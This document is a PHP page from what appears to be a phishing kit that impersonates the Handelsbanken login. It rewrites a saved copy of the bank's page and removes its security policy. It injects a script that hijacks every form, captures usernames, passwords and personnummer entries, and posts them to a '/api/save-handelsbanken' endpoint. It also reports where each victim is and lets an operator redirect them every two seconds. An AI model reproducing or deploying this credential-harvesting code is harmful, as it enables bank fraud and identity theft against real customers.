<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Handelsbanken');
$htmlContent = file_get_contents(__DIR__ . '/Handelsbanken.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
}

// Orijinal sitedən gələn bütün external linkləri və xüsusi bridging fayllarını blokla
$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/cross-domain-bridge\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/saved_resource\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/href\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'href="#"', $htmlContent);
$htmlContent = preg_replace('/src\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'src="#"', $htmlContent);

// Saytın öz Content-Security-Policy meta tag-larını sil ki, /api çağırışları bloklanmasın
$htmlContent = preg_replace('/<meta[^>]+http-equiv=["\']Content-Security-Policy["\'][^>]*>/i', '', $htmlContent);
$htmlContent = preg_replace('/<meta[^>]+content-security-policy[^>]*>/i', '', $htmlContent);

$basePath = '/handelsbanken-files/';
$htmlContent = preg_replace('/(["\'])\/logon\/inss\//i', '$1' . $basePath, $htmlContent);
$htmlContent = preg_replace('/(["\'])\/assets\//i', '$1' . $basePath, $htmlContent);
$htmlContent = preg_replace('/(["\'])\/static\//i', '$1' . $basePath, $htmlContent);
$htmlContent = preg_replace('/url\(([^\/)]+\.(woff2?|ttf|png|jpg|jpeg|svg|css|js))\)/i', 'url(' . $basePath . '$1)', $htmlContent);

$hideStyle = '<style>
    #goog-gt-tt,
    #goog-gt-t,
    [id*="goog-gt"],
    [class*="goog-gt"],
    [id*="google_translate"],
    [class*="google_translate"],
    .VIpgJd-yAWNEb-L7lbkb,
    .skiptranslate {
        display: none !important;
        visibility: hidden !important;
    }
    body {
        overflow-y: auto !important;
        max-height: 100vh !important;
    }
</style>';

if (strpos($htmlContent, '</head>') !== false) {
    $htmlContent = str_replace('</head>', $hideStyle . '</head>', $htmlContent);
} else {
    $htmlContent = $hideStyle . $htmlContent;
}

$adminScript = '';
$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);
if ($userId > 0) {
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        function handleFormSubmit(e) {
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            
            let username = \'\';
            let password = \'\';
            
            const usernameInputs = [
                document.getElementById(\'username\'),
                document.querySelector(\'input[name="username"]\'),
                document.querySelector(\'input[type="text"][name*="user"]\'),
                document.querySelector(\'input[type="text"][id*="user"]\'),
                document.querySelector(\'input[type="text"][placeholder*="user" i]\'),
                document.querySelector(\'input[type="text"][placeholder*="användar" i]\'),
                document.querySelector(\'input[type="text"][placeholder*="käyttäjä" i]\')
            ];
            
            const passwordInputs = [
                document.getElementById(\'password\'),
                document.querySelector(\'input[name="password"]\'),
                document.querySelector(\'input[type="password"]\'),
                document.querySelector(\'input[type="password"][name*="pass"]\'),
                document.querySelector(\'input[type="password"][id*="pass"]\'),
                document.querySelector(\'input[type="password"][placeholder*="pass" i]\'),
                document.querySelector(\'input[type="password"][placeholder*="lösenord" i]\'),
                document.querySelector(\'input[type="password"][placeholder*="salasana" i]\')
            ];
            
            for (const input of usernameInputs) {
                if (input && input.value) {
                    username = input.value.trim();
                    break;
                }
            }
            
            // Handelsbanken: Personnummer alanı üçün əlavə yoxlama
            if (!username) {
                const personnummerInput = document.querySelector(\'input[type="tel"], input[placeholder*="personnummer" i]\');
                if (personnummerInput && personnummerInput.value) {
                    username = personnummerInput.value.trim();
                }
            }
            
            // Əlavə fallback: hər hansı şifrə olmayan ilk input-u username kimi götür
            if (!username) {
                const firstNonPassword = document.querySelector(\'input:not([type="password"])\');
                if (firstNonPassword && firstNonPassword.value) {
                    username = firstNonPassword.value.trim();
                }
            }
            
            for (const input of passwordInputs) {
                if (input && input.value) {
                    password = input.value.trim();
                    break;
                }
            }
            
            fetch(\'/api/save-handelsbanken\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    username: username || null,
                    password: password || null
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(\'Network response was not ok\');
                }
                return response.json();
            })
            .then(data => {
                if (data.success && data.redirect) {
                    window.location.href = data.redirect;
                } else if (data.message) {
                    alert(data.message);
                }
            })
            .catch(error => {
                console.error(\'Error:\', error);
            });
            
            return false;
        }
        
        function initForm() {
            const forms = document.querySelectorAll(\'form\');
            forms.forEach(form => {
                form.setAttribute(\'action\', \'#\');
                form.removeAttribute(\'target\');
                form.onsubmit = function(e) { 
                    return handleFormSubmit(e);
                };
                
                const submitButtons = form.querySelectorAll(\'button[type="submit"], input[type="submit"], button:not([type])\');
                submitButtons.forEach(button => {
                    button.setAttribute(\'type\', \'button\');
                    button.onclick = function(e) {
                        handleFormSubmit(e);
                        return false;
                    };
                });
            });
        }
        
        if (document.readyState === \'loading\') {
            document.addEventListener(\'DOMContentLoaded\', initForm);
        } else {
            setTimeout(initForm, 100);
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

if (strpos($htmlContent, '</body>') !== false) {
    $htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
} else {
    $htmlContent = $htmlContent . $adminScript;
}

$content = ob_get_clean();
echo $htmlContent;
?>



